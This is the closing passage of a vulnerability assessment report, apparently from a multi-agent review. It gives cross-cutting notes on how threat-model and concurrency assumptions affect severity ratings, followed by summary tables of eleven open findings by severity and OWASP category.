## Cross-cutting: context boundaries (notes for sibling artifacts)

These are constraints that surfaced during the vuln review but belong
primarily in adjacent artifacts. Not investigated here — flagged so the
sibling agents do not miss them.

- **Threat-model boundary:** The trust model ("local mode = trusted; tunnel mode
  = JWT") is the foundation for every severity rating in this report. If the
  THREAT-MODEL artifact concludes the tunnel-mode trust boundary is weaker than
  assumed (e.g. tunnel-URL leakage is more likely than modeled, or the
  `EPHEMERAL_SECRET` lifecycle has gaps not visible from the auth.ts file alone),
  every Medium and High severity here may need to be revised upward.
- **Concurrency-model boundary:** The intent-goal sentence "Concurrency model is
  eventual-consistency: no locking, the next `haiku_run_next` tick observes
  drift" is load-bearing for V-04 and V-05. If the threat model or the design
  artifact concludes that some locking is in fact required (e.g. for atomic
  baseline-update under concurrent SPA + MCP writes), V-04's recommended fix
  needs to integrate with that locking primitive.

---

## Summary statistics

| Severity      | Count |
|---------------|-------|
| Critical      | 0     |
| High          | 2     |
| Medium        | 6     |
| Low           | 3     |
| Informational | 0     |
| **Total**     | **11**|

By OWASP Top 10 (2021) category:

| Category                                        | Count |
|-------------------------------------------------|-------|
| A01 Broken Access Control                       | 2     |
| A03 Injection                                   | 3     |
| A04 Insecure Design                             | 3     |
| A05 Security Misconfiguration                   | 1     |
| A09 Security Logging and Monitoring Failures    | 2     |

By mitigation status:

| Status        | Count |
|---------------|-------|
| Open          | 11    |
| Mitigated     | 0     |
| Accepted risk | 0     |

This is the first formal vulnerability assessment of the out-of-band human-
file-modification surface, so trend analysis is not applicable. Re-run after
remediation of the High-severity findings (V-01, V-02) and the V-03 author-
identity fix; expected outcome is reduction of the High count to zero and at
least four Medium findings closed by the same patches (V-06, V-07, V-08 are
independent, but a unified upload-hardening pass naturally addresses V-01–V-03
plus V-06).
